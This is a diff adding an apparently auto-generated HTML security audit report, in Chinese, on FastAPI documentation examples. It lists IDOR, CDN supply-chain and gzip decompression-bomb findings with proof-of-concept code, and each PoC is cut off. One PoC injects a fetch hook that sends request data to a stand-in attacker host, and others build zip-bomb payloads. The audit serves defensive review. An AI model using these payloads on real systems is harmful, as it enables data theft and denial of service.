@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CodeSentinel 安全审计报告 - fastapi</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #16213e; margin-top: 30px; }
+        .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
+        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
+        .summary-card h3 { margin: 0; font-size: 2em; }
+        .summary-card p { margin: 5px 0 0; }
+        .vuln-card { background: #f8f9fa; padding: 20px; margin: 15px 0; border-radius: 5px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        details { margin-top: 10px; }
+        summary { cursor: pointer; color: #e94560; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>CodeSentinel 安全审计报告</h1>
+    <p><strong>项目:</strong> fastapi | <strong>语言:</strong> {"Python": 100.0} | <strong>时间:</strong> 2026-07-11 19:59:32</p>
+
+    <h2>执行摘要</h2>
+    <p>本次安全审计针对开源项目FastAPI（https://github.com/fastapi/fastapi）进行。审计发现4个已确认的安全漏洞，包括1个不安全的直接对象引用（IDOR）、1个不安全的第三方资源引用（供应链攻击风险）以及2个压缩炸弹/拒绝服务（DoS）漏洞。这些漏洞主要存在于项目的文档示例代码中，但若用户直接复制到生产环境使用，将面临严重的安全风险。整体风险评分为75，属于高风险等级。建议开发团队立即修复高优先级漏洞，并在文档中明确安全警告。</p>
+    <p><strong>风险评分:</strong> 75/100</p>
+
+    <div class="summary-grid">
+        <div class="summary-card" style="background:#dc3545;"><h3>0</h3><p>严重</p></div>
+        <div class="summary-card" style="background:#fd7e14;"><h3>1</h3><p>高危</p></div>
+        <div class="summary-card" style="background:#ffc107;color:#333;"><h3>3</h3><p>中危</p></div>
+        <div class="summary-card" style="background:#28a745;"><h3>0</h3><p>低危</p></div>
+    </div>
+
+    <h2>漏洞详情</h2>
+    
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-39C8AC91 - 不安全的直接对象引用（IDOR）</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> docs_src\app_testing\app_b_an_py310\main.py:19</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if item_id not in fake_db:
+        raise HTTPException(status_code=404, detail=&quot;Item not found&quot;)
+    return fake_db[item_id]</code></pre>
+                <p><strong>数据流:</strong> 用户通过URL路径参数item_id直接访问数据库中的对象，认证仅依赖共享令牌，没有基于用户角色的访问控制。</p>
+                <p><strong>判断理由:</strong> 虽然存在令牌认证，但所有持有有效令牌的用户都可以访问任何item_id对应的数据，没有实现基于用户或角色的访问控制。攻击者可以枚举item_id来获取所有数据。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此IDOR漏洞访问所有存储在fake_db中的数据，包括但不限于：1) 通过枚举item_id获取所有项目信息；2) 通过POST端点创建任意数据，可能导致数据污染或注入；3) 由于所有持有有效令牌的用户共享相同的访问权限，无法区分合法用户和攻击者。在真实场景中，这可能暴露敏感数据（如用户信息、配置数据等），并允许未授权用户修改或删除数据。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 不安全的直接对象引用（IDOR）漏洞利用
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import requests
+import sys
+
+# 目标API基础URL
+BASE_URL = &quot;http://localhost:8000&quot;
+
+# 硬编码的共享令牌（从源代码中获取）
+TOKEN = &quot;coneofsilence&quot;
+
+# 已知的item_id列表（可从源代码或枚举获得）
+KNOWN_ITEMS = [&quot;foo&quot;, &quot;bar&quot;]
+
+# 用于枚举的ID范围（如果存在更多项目）
+ENUMERATION_IDS = [&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;, &quot;qux&quot;, &quot;admin&quot;, &quot;user1&quot;, &quot;test&quot;, &quot;secret&quot;</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-BA3B0BCE - 不安全的第三方资源引用（供应链攻击风险）</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> docs_src\custom_docs_ui\tutorial001_py310.py:14</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>swagger_js_url=&quot;https://unpkg.com/swagger-ui-dist@5/swagger-ui-bundle.js&quot;</code></pre>
+                <p><strong>数据流:</strong> 静态资源URL硬编码在代码中，直接从unpkg CDN加载JavaScript文件</p>
+                <p><strong>判断理由:</strong> 使用unpkg.com作为CDN加载Swagger UI的JavaScript文件存在供应链攻击风险。如果unpkg被攻破或域名被劫持，攻击者可以替换该JS文件为恶意代码，从而在用户浏览器中执行任意JavaScript。建议将关键前端资源托管在受控的服务器上，或使用Subresource Integrity (SRI) 校验。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 用户浏览器中执行任意JavaScript代码；2) 窃取用户的会话cookie和认证令牌；3) 拦截并篡改API请求/响应；4) 通过伪造登录框窃取用户凭证；5) 进一步利用XSS攻击获取敏感数据或进行账户劫持。由于Swagger UI通常用于API文档和测试，攻击者可能获取API密钥、访问令牌等敏感信息。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 供应链攻击PoC：模拟unpkg CDN被劫持后替换Swagger UI JS文件
+# 前置条件：攻击者已控制unpkg.com或通过DNS劫持/中间人攻击拦截请求
+
+# 1. 创建恶意JS文件（模拟XSS payload）
+echo &#x27;// 仅供研究使用 - 恶意Swagger UI bundle
+(function() {
+    // 窃取API请求中的敏感信息
+    var originalFetch = window.fetch;
+    window.fetch = function() {
+        var args = arguments;
+        console.log(&quot;[恶意代码] 拦截到fetch请求:&quot;, args[0]);
+        // 将请求信息发送到攻击者服务器
+        var img = new Image();
+        img.src = &quot;https://attacker.example.com/steal?url=&quo</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-F05B9C2E - 不安全的解压缩（Zip Bomb / 压缩炸弹攻击）</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> docs_src/custom_request_and_route/tutorial001_py310.py:11</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>body = gzip.decompress(body)</code></pre>
+                <p><strong>数据流:</strong> 用户通过HTTP请求发送gzip压缩数据 -&gt; GzipRequest.body()方法接收 -&gt; gzip.decompress(body)直接解压，未做大小限制</p>
+                <p><strong>判断理由:</strong> 代码直接使用gzip.decompress()解压用户提供的压缩数据，没有对解压后数据的大小进行任何限制。攻击者可以发送一个极小的压缩包（压缩炸弹），解压后产生巨大的数据量，导致服务器内存耗尽或CPU过载，造成拒绝服务攻击。这是一个经典的压缩炸弹攻击向量。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致服务器内存耗尽或CPU过载，造成拒绝服务（DoS）攻击。攻击者只需发送一个极小的压缩包（例如几十KB），解压后可能产生数百MB甚至数GB的数据，迅速消耗服务器资源。在极端情况下，可能导致服务器进程崩溃或系统无响应。由于这是FastAPI官方文档中的示例代码，用户可能直接复制到生产环境中使用，因此影响范围可能较广。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 压缩炸弹攻击 (Zip Bomb)
+仅供安全研究使用，请勿用于非法用途。
+&quot;&quot;&quot;
+import gzip
+import requests
+import sys
+
+# 目标URL（假设FastAPI应用运行在本地8000端口）
+TARGET_URL = &quot;http://localhost:8000/sum&quot;
+
+# 生成压缩炸弹：一个极小的gzip压缩包，解压后产生大量数据
+# 这里使用10MB的重复数据，实际攻击中可以更大
+UNCOMPRESSED_SIZE = 10 * 1024 * 1024  # 10 MB
+payload_data = b&quot;A&quot; * UNCOMPRESSED_SIZE
+
+# 使用最高压缩级别压缩，生成极小的压缩包
+compressed_payload = gzip.compress(payload_data, compresslevel=9)
+
+print(f&quot;[+] 原始数据大小: {UN</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-E551AB42 - 缺少输入验证和大小限制</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> docs_src/custom_request_and_route/tutorial001_py310.py:10</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if &quot;gzip&quot; in self.headers.getlist(&quot;Content-Encoding&quot;):
+    body = gzip.decompress(body)</code></pre>
+                <p><strong>数据流:</strong> 用户控制Content-Encoding头 -&gt; 触发解压缩逻辑 -&gt; 无限制解压</p>
+                <p><strong>判断理由:</strong> 代码仅检查Content-Encoding头是否包含&#x27;gzip&#x27;字符串，但没有验证解压后body的大小，也没有对原始压缩数据的大小做限制。攻击者可以发送任意大小的压缩数据，或者通过精心构造的压缩数据导致服务器资源耗尽。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 服务器内存耗尽，导致拒绝服务(DoS)；2) CPU资源被大量占用，影响正常请求处理；3) 在极端情况下可能导致服务器进程崩溃或系统OOM Killer触发；4) 如果服务器部署在容器环境中，可能影响同一宿主机上的其他服务。攻击者只需要发送很小的压缩数据包（几KB到几MB），就能造成数GB的内存消耗，是一种高效的DoS攻击方式。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 仅供研究使用
+漏洞: VULN-E551AB42 - Gzip解压炸弹攻击
+目标: FastAPI自定义GzipRequest示例代码
+&quot;&quot;&quot;
+
+import gzip
+import requests
+import sys
+import time
+
+# 目标URL (假设服务运行在本地8000端口)
+TARGET_URL = &quot;http://localhost:8000/sum&quot;
+
+def create_zip_bomb(target_size_mb: int = 100) -&gt; bytes:
+    &quot;&quot;&quot;
+    创建一个解压炸弹
+    通过大量重复数据实现高压缩比
+    &quot;&quot;&quot;
+    # 使用重复的零字节，压缩比极高
+    # 1MB压缩数据可解压出数GB
+    payload = b&quot;\x00&quot; * (target_size_mb * 10</code></pre></details>
+            </div>
+
+    <hr>
+    <p style="color:#666;font-size:0.9em;">报告由 CodeSentinel 自动生成 | 2026-07-11 19:59:32</p>
+</div>
+</body>
+</html>
